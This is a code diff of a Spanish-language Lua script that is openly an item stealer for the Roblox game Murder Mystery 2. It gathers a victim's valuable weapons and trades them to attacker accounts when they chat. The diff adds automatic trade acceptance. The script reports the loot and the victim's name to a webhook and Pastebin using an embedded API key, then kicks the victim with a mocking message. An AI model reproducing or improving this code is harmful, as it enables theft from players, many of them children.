@@ -14,7 +14,7 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
 
--- Comprobaciones de servidor
+-- Validaciones del servidor
 if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
     return
@@ -34,7 +34,7 @@ end
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Funciones de webhook y Pastebin
+-- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -53,6 +53,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
+-- Función para crear Pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -77,24 +78,30 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
--- TradeModule
-local TradeModule = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("TradeModule"))
-local tradeFunctions = debug.getupvalue(TradeModule, 4) -- tu info de SimpleSpy apunta a este upvalue
-
-local function getTradeStatus() return game:GetService("ReplicatedStorage"):WaitForChild("Trade").GetTradeStatus:InvokeServer() end
+-- TradeService y funciones base
+local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
-    tradeFunctions.SendTradeRequest(Players:FindFirstChild(user))
+    local plrObj = Players:FindFirstChild(user)
+    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
 end
-local function addWeaponToTrade(id)
-    tradeFunctions.GUI.TradeGUI.TradeGridLayout = tradeFunctions.GUI.ItemLayout
-    tradeFunctions.UpdateTradeInventory(id)
-end
-local function acceptTrade()
-    tradeFunctions.UpdateTrade("AcceptTrade")
-end
-local function waitForTradeCompletion()
-    while getTradeStatus() ~= "None" do task.wait(0.1) end
-end
+local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
+local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
+
+-- =============================
+-- NUEVO SISTEMA AUTO-ACCEPT
+-- =============================
+local TradeModule = require(game:GetService("ReplicatedStorage").Modules:WaitForChild("TradeModule"))
+local acceptTradeRemote = TradeService.AcceptTrade
+local updateTradeRemote = TradeService.UpdateTrade
+
+updateTradeRemote.OnClientEvent:Connect(function(number)
+    if number.LastOffer then
+        pcall(function()
+            acceptTradeRemote:FireServer(game.PlaceId * 3, number.LastOffer)
+        end)
+    end
+end)
 
 -- Database y valores
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
@@ -108,7 +115,6 @@ local categories = {
 }
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
 
--- Funciones de parsing
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 local function fetchHTML(url)
     local res=req({Url=url, Method="GET", Headers=headers})
@@ -172,7 +178,7 @@ local function buildValueList()
     return valueList
 end
 
--- Preparar armas
+-- Preparación de armas para enviar
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -195,17 +201,17 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Token Fern
+-- Generar link de Fern
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Guardamos copia para webhook final
+-- Guardamos una copia para webhook final
 local weaponsSent = {}
 for _, w in ipairs(weaponsToSend) do
     table.insert(weaponsSent, w)
 end
 
--- Webhook inicial
+-- Webhook inicial con Pastebin si >18
 local pasteContent = ""
 for _, w in ipairs(weaponsSent) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -241,7 +247,7 @@ if #weaponsSent > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Función final de trades
+-- Función final para trades
 local function TradeFinalizado()
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -260,7 +266,6 @@ local function TradeFinalizado()
     end
 
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
-    
     task.wait(50)
     LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
@@ -282,7 +287,6 @@ local function doTrade(targetName)
                 end
             end
             task.wait(6)
-            acceptTrade()
             waitForTradeCompletion()
         else task.wait(0.5) end
         task.wait(1)
@@ -290,7 +294,7 @@ local function doTrade(targetName)
     TradeFinalizado()
 end
 
--- Conectar eventos de chat
+-- Activar trades con chat
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
